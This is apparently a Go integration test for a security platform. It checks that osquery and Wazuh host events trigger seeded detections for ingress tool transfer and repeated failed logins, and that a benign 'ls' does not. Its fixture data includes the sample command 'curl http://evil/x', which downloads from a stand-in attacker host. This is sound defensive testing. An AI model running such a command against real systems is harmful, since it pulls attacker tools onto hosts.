package ingestion

// §6.6/§6.5 #118 H-2 — end-to-end proof that a host event flows normalize → canonical (OCSF + §6.5 field groups) →
// a SEEDED host detection FIRES, and does not over-fire on benign activity. Uses the REAL osquery/Wazuh normalizers
// (H-1) + the REAL detection engine reading the seeded pack (migration 0069) + the nested field resolver (data.
// process.cmdline). ingestion already imports detection, so there is no import cycle.

import (
	"context"
	"testing"

	"github.com/ArowuTest/nirvet/internal/detection"
	"github.com/ArowuTest/nirvet/internal/platform/database"
	"github.com/ArowuTest/nirvet/internal/platform/eventstore"
	"github.com/ArowuTest/nirvet/internal/platform/testsupport"
	"github.com/ArowuTest/nirvet/internal/tenant"
	"github.com/google/uuid"
)

func hostToEvent(tid uuid.UUID, in *IngestInput) eventstore.NormalizedEvent {
	return eventstore.NormalizedEvent{
		TenantID: tid, ClassName: in.ClassName, ActivityName: in.ActivityName,
		Severity: in.Severity, ActorRef: in.ActorRef, TargetRef: in.TargetRef,
		Action: in.Action, Outcome: in.Outcome, Data: in.Data,
	}
}

func firedRule(ms []detection.Match, name string) bool {
	for _, m := range ms {
		if m.RuleName == name {
			return true
		}
	}
	return false
}

func TestHostEvent_FiresSeededDetection(t *testing.T) {
	db, err := database.Connect(context.Background(), testsupport.RequireDSN(t))
	if err != nil {
		t.Fatalf("connect: %v", err)
	}
	t.Cleanup(db.Close)
	tn, err := tenant.NewService(tenant.NewRepository(db)).Create(context.Background(), tenant.CreateInput{Name: "host-" + uuid.NewString()})
	if err != nil {
		t.Fatalf("tenant: %v", err)
	}
	eng := detection.NewEngine(detection.NewRepository(db))
	ctx := context.Background()

	// osquery process running curl → fires "Host: ingress tool transfer" (via data.process.cmdline nested match).
	mal := &IngestInput{Source: "host_osquery", Data: map[string]any{
		"name": "process_events", "hostIdentifier": "web-01",
		"columns": map[string]any{"path": "/usr/bin/curl", "cmdline": "curl http://evil/x", "pid": "1", "username": "root"},
	}}
	normalizeOsquery(mal)
	ms, err := eng.Evaluate(ctx, tn.ID, hostToEvent(tn.ID, mal))
	if err != nil {
		t.Fatalf("evaluate: %v", err)
	}
	if !firedRule(ms, "Host: ingress tool transfer") {
		t.Fatalf("a host process running curl must fire the ingress-tool detection; got %+v", ms)
	}

	// benign process → must NOT fire the tool-transfer rule (no over-fire).
	benign := &IngestInput{Source: "host_osquery", Data: map[string]any{
		"name": "process_events", "hostIdentifier": "web-01",
		"columns": map[string]any{"path": "/bin/ls", "cmdline": "ls -la", "pid": "2", "username": "root"},
	}}
	normalizeOsquery(benign)
	mb, _ := eng.Evaluate(ctx, tn.ID, hostToEvent(tn.ID, benign))
	if firedRule(mb, "Host: ingress tool transfer") {
		t.Fatal("a benign `ls` process must NOT fire the ingress-tool detection")
	}

	// Wazuh failed auth → fires "Host: repeated failed authentication".
	auth := &IngestInput{Source: "host_wazuh", Data: map[string]any{
		"agent": map[string]any{"name": "web-01"},
		"rule":  map[string]any{"level": float64(10), "description": "sshd", "groups": []any{"authentication_failed"}},
		"data":  map[string]any{"srcuser": "admin", "srcip": "1.2.3.4"},
	}}
	normalizeWazuh(auth)
	ma, _ := eng.Evaluate(ctx, tn.ID, hostToEvent(tn.ID, auth))
	if !firedRule(ma, "Host: repeated failed authentication") {
		t.Fatalf("a failed host auth must fire the brute-force detection; got %+v", ma)
	}
}
